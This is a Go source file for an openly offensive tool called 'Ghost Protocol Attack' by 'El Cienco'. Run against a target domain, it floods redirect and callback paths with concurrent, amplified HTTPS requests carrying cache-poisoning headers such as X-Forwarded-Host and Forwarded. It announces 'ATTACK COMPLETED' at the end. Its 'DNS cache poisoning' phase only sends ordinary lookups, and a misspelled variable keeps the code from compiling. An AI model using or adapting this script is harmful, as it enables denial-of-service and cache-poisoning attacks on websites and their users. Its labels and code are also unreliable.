package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ==================== STRUCTURES ====================

type GPAEngine struct {
	Target        string
	DNSResolvers  []string
	Duration      int
	Workers       int
	CachePoison   bool
	Verbose       bool
	
	// Stats
	totalRequests   atomic.Uint64
	totalLoops      atomic.Uint64
	amplification   atomic.Uint64
	activeWorkers   atomic.Int32
	
	// HTTP Client
	client          *http.Client
	redirectClient  *http.Client
	
	// DNS Cache
	dnsCache        sync.Map
}

type LoopPayload struct {
	Path       string
	Headers    map[string]string
	Parameters map[string]string
	Method     string
}

// ==================== INITIALIZATION ====================

func NewGPAEngine(target string, resolvers []string, duration, workers int) *GPAEngine {
	// Custom transport dengan connection pooling besar
	transport := &http.Transport{
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 10000,
		MaxConnsPerHost:     0, // Unlimited
		IdleConnTimeout:     90 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS10,
		},
		DisableKeepAlives: false,
		DisableCompression: true,
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	
	// Client tanpa follow redirect (untuk trigger loop)
	noRedirectClient := &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // JANGAN follow redirect
		},
	}
	
	// Client dengan follow redirect (untuk DNS poisoning)
	redirectClient := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}
	
	return &GPAEngine{
		Target:         target,
		DNSResolvers:   resolvers,
		Duration:       duration,
		Workers:        workers,
		CachePoison:    true,
		Verbose:        true,
		client:         noRedirectClient,
		redirectClient: redirectClient,
	}
}

// ==================== DNS CACHE POISONING ====================

func (g *GPAEngine) PoisonDNSCache() {
	fmt.Println("[GPA] Phase 1: DNS Cache Poisoning...")
	
	// Subdomain untuk poisoning
	poisonDomains := []string{
		"api", "cdn", "static", "media", "assets", "img", "css", "js",
		"www1", "www2", "mail", "smtp", "pop", "ftp", "secure", "vpn",
		"admin", "portal", "dashboard", "app", "mobile", "m", "ww",
	}
	
	var wg sync.WaitGroup
	poisonCount := atomic.Uint64{}
	
	for i := 0; i < g.Workers/2; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			
			resolver := g.DNSResolvers[workerID%len(g.DNSResolvers)]
			
			for {
				if poisionCount.Load() > uint64(len(poisonDomains)*10) {
					break
				}
				
				// Pilih subdomain random
				subdomain := poisonDomains[rand.Intn(len(poisonDomains))]
				fullDomain := fmt.Sprintf("%s.%s", subdomain, g.Target)
				
				// Query DNS via resolver
				g.dnsQuery(resolver, fullDomain)
				poisionCount.Add(1)
				
				// Cache warmup dengan HTTP request
				g.warmupHTTPCache(fullDomain)
				
				time.Sleep(time.Millisecond * 10)
			}
		}(i)
	}
	
	wg.Wait()
	fmt.Printf("[GPA] DNS Cache Poisoned: %d queries sent\n", poisionCount.Load())
}

func (g *GPAEngine) dnsQuery(resolver, domain string) {
	// Custom DNS query
	conn, err := net.DialTimeout("udp", resolver+":53", 2*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	
	// Simple DNS query packet untuk A record
	query := g.buildDNSQuery(domain)
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	conn.Write(query)
	
	// Baca response (untuk memastikan cache tersimpan)
	buf := make([]byte, 512)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	conn.Read(buf)
	
	g.dnsCache.Store(domain, resolver)
}

func (g *GPAEngine) buildDNSQuery(domain string) []byte {
	// DNS header
	header := []byte{
		0x12, 0x34, // Transaction ID
		0x01, 0x00, // Flags (standard query)
		0x00, 0x01, // Questions: 1
		0x00, 0x00, // Answer RRs
		0x00, 0x00, // Authority RRs
		0x00, 0x00, // Additional RRs
	}
	
	// Question section
	question := []byte{}
	labels := strings.Split(domain, ".")
	for _, label := range labels {
		question = append(question, byte(len(label)))
		question = append(question, []byte(label)...)
	}
	question = append(question, 0x00) // Terminator
	
	// QTYPE: A (1), QCLASS: IN (1)
	question = append(question, 0x00, 0x01, 0x00, 0x01)
	
	return append(header, question...)
}

func (g *GPAEngine) warmupHTTPCache(domain string) {
	urls := []string{
		fmt.Sprintf("http://%s/", domain),
		fmt.Sprintf("https://%s/", domain),
	}
	
	for _, u := range urls {
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("User-Agent", "GPA-CacheWarmer/2310")
		req.Header.Set("Host", g.Target)
		
		g.redirectClient.Do(req)
	}
}

// ==================== PAYLOAD GENERATOR ====================

func (g *GPAEngine) GenerateLoopPayloads() []LoopPayload {
	payloads := []LoopPayload{}
	
	// Path yang rentan redirect loop
	paths := []string{
		"/callback",
		"/oauth/callback",
		"/oauth2/callback",
		"/auth/callback",
		"/login/callback",
		"/redirect",
		"/r",
		"/go",
		"/out",
		"/external",
		"/api/redirect",
		"/api/callback",
		"/webhook",
		"/payment/callback",
		"/payment/return",
		"/checkout/complete",
		"/return",
		"/next",
		"/continue",
	}
	
	// Header yang memicu cache poisoning
	headers := map[string]string{
		"X-Forwarded-Host":   fmt.Sprintf("cache-%d.ghost.elcienco", rand.Intn(9999)),
		"X-Original-URL":     "/",
		"X-Rewrite-URL":      "/",
		"X-Forwarded-Proto":  "https",
		"Forwarded":          fmt.Sprintf("host=cache-%d.ghost.elcienco;proto=https", rand.Intn(9999)),
		"Referer":            fmt.Sprintf("https://%s/", g.DNSResolvers[0]),
		"Origin":             fmt.Sprintf("https://cache%d.ghost.elcienco", rand.Intn(9999)),
	}
	
	// Parameters yang memicu redirect
	params := map[string]string{
		"redirect_uri":  "https://" + g.Target + "/callback",
		"return_url":    "/redirect",
		"next":          "/",
		"callback":      "https://" + g.Target + "/auth/callback",
		"redirect":      "/",
		"goto":          "/",
		"dest":          "/",
		"return":        "/",
		"from":          "/",
		"ref":           "/",
	}
	
	for _, path := range paths {
		payloads = append(payloads, LoopPayload{
			Path:       path,
			Headers:    headers,
			Parameters: params,
			Method:     "GET",
		})
	}
	
	return payloads
}

// ==================== LOOP WORKER ====================

func (g *GPAEngine) loopWorker(workerID int, payloads []LoopPayload) {
	g.activeWorkers.Add(1)
	defer g.activeWorkers.Add(-1)
	
	endTime := time.Now().Add(time.Duration(g.Duration) * time.Second)
	
	for time.Now().Before(endTime) {
		// Pilih payload random
		payload := payloads[rand.Intn(len(payloads))]
		
		// Trigger loop
		g.triggerLoop(payload)
		g.totalRequests.Add(1)
		
		// Amplify dengan multiple requests
		for i := 0; i < 3; i++ {
			go g.amplifyRequest(payload)
		}
		
		// Small delay untuk menghindari local resource exhaustion
		time.Sleep(time.Millisecond * time.Duration(rand.Intn(10)))
	}
}

func (g *GPAEngine) triggerLoop(payload LoopPayload) {
	// Bangun URL dengan parameters
	u, err := url.Parse(fmt.Sprintf("https://%s%s", g.Target, payload.Path))
	if err != nil {
		return
	}
	
	q := u.Query()
	for k, v := range payload.Parameters {
		q.Set(k, v)
	}
	u.RawQuery = q.Encode()
	
	// Buat request
	req, err := http.NewRequest(payload.Method, u.String(), nil)
	if err != nil {
		return
	}
	
	// Set headers
	for k, v := range payload.Headers {
		req.Header.Set(k, v)
	}
	req.Header.Set("User-Agent", "GPA-Engine/2310")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")
	
	// Kirim request (tanpa follow redirect)
	resp, err := g.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	// Cek apakah server merespon dengan redirect
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		location := resp.Header.Get("Location")
		if location != "" {
			// Loop detected - cek apakah redirect kembali ke target
			if strings.Contains(location, g.Target) {
				g.totalLoops.Add(1)
				
				// Trigger follow-up request untuk amplifikasi
				go g.followRedirect(location, payload.Headers)
			}
		}
	}
	
	// Additional check untuk header Location di response body
	if resp.Header.Get("Content-Type") == "application/json" {
		// Bisa jadi JSON response dengan redirect URL
	}
}

func (g *GPAEngine) followRedirect(location string, headers map[string]string) {
	req, _ := http.NewRequest("GET", location, nil)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	
	resp, err := g.client.Do(req)
	if err == nil {
		resp.Body.Close()
		g.amplification.Add(1)
	}
}

func (g *GPAEngine) amplifyRequest(payload LoopPayload) {
	// Buat variasi request untuk amplifikasi
	domains := []string{
		g.Target,
		fmt.Sprintf("www.%s", g.Target),
		fmt.Sprintf("api.%s", g.Target),
		fmt.Sprintf("cdn.%s", g.Target),
	}
	
	domain := domains[rand.Intn(len(domains))]
	u := fmt.Sprintf("https://%s%s", domain, payload.Path)
	
	req, _ := http.NewRequest("GET", u, nil)
	for k, v := range payload.Headers {
		req.Header.Set(k, v)
	}
	
	// Amplify dengan multiple connection attempts
	for i := 0; i < 5; i++ {
		go func() {
			resp, _ := g.client.Do(req)
			if resp != nil {
				resp.Body.Close()
				g.amplification.Add(1)
			}
		}()
		time.Sleep(time.Microsecond * 100)
	}
}

// ==================== MONITOR ====================

func (g *GPAEngine) monitor() {
	ticker := time.NewTicker(2 * time.Second)
	start := time.Now()
	
	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Printf("[GPA MONITOR] Target: %s | Workers: %d | Duration: %ds\n", 
		g.Target, g.Workers, g.Duration)
	fmt.Println(strings.Repeat("=", 70))
	
	for range ticker.C {
		elapsed := time.Since(start).Seconds()
		
		if int(elapsed) >= g.Duration {
			break
		}
		
		requests := g.totalRequests.Load()
		loops := g.totalLoops.Load()
		amp := g.amplification.Load()
		active := g.activeWorkers.Load()
		
		ampFactor := float64(0)
		if requests > 0 {
			ampFactor = float64(amp) / float64(requests)
		}
		
		// Progress bar
		progress := int((elapsed / float64(g.Duration)) * 50)
		bar := strings.Repeat("█", progress) + strings.Repeat("░", 50-progress)
		
		fmt.Printf("\r[%s] %ds | Req: %d | Loops: %d | Amp: %.2fx | Active: %d",
			bar, int(elapsed), requests, loops, ampFactor, active)
	}
	
	fmt.Println("\n" + strings.Repeat("=", 70))
}

// ==================== MAIN EXECUTION ====================

func (g *GPAEngine) Execute() {
	fmt.Println(strings.Repeat("=", 70))
	fmt.Println("╔══════════════════════════════════════════════════════════════════╗")
	fmt.Println("║     EL CIENCO - GHOST PROTOCOL ATTACK (GPA) v2310                ║")
	fmt.Println("║     Infinite Redirect Loop via DNS Cache Poisoning               ║")
	fmt.Println("╚══════════════════════════════════════════════════════════════════╝")
	fmt.Println(strings.Repeat("=", 70))
	
	// Phase 1: DNS Cache Poisoning
	if g.CachePoison {
		g.PoisonDNSCache()
		fmt.Println()
	}
	
	// Phase 2: Generate Payloads
	payloads := g.GenerateLoopPayloads()
	fmt.Printf("[GPA] Generated %d loop payloads\n", len(payloads))
	
	// Phase 3: Start Monitor
	go g.monitor()
	
	// Phase 4: Launch Workers
	fmt.Printf("[GPA] Launching %d workers...\n", g.Workers)
	
	var wg sync.WaitGroup
	for i := 0; i < g.Workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			g.loopWorker(workerID, payloads)
		}(i)
		time.Sleep(time.Millisecond * 5)
	}
	
	// Phase 5: Wait for completion
	wg.Wait()
	
	// Final Report
	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Println("[GPA] ATTACK COMPLETED")
	fmt.Printf("  Total Requests:      %d\n", g.totalRequests.Load())
	fmt.Printf("  Total Loops Created: %d\n", g.totalLoops.Load())
	fmt.Printf("  Amplification:       %d requests\n", g.amplification.Load())
	
	ampFactor := float64(0)
	if g.totalRequests.Load() > 0 {
		ampFactor = float64(g.amplification.Load()) / float64(g.totalRequests.Load())
	}
	fmt.Printf("  Amplification Ratio: %.2fx\n", ampFactor)
	fmt.Println(strings.Repeat("=", 70))
}

// ==================== CLI MAIN ====================

func main() {
	target := flag.String("t", "", "Target domain (required)")
	resolvers := flag.String("r", "8.8.8.8,1.1.1.1,9.9.9.9", "DNS resolvers (comma-separated)")
	duration := flag.Int("d", 120, "Attack duration in seconds")
	workers := flag.Int("w", 50, "Number of workers")
	flag.Parse()
	
	if *target == "" {
		fmt.Println("Usage: ./gpa_engine -t <target_domain> [-r <dns_resolvers>] [-d <duration>] [-w <workers>]")
		fmt.Println("\nExamples:")
		fmt.Println("  ./gpa_engine -t vulnerable-site.com")
		fmt.Println("  ./gpa_engine -t target.com -r 8.8.8.8,8.8.4.4 -d 300 -w 100")
		os.Exit(1)
	}
	
	resolverList := strings.Split(*resolvers, ",")
	
	engine := NewGPAEngine(*target, resolverList, *duration, *workers)
	engine.Execute()
}
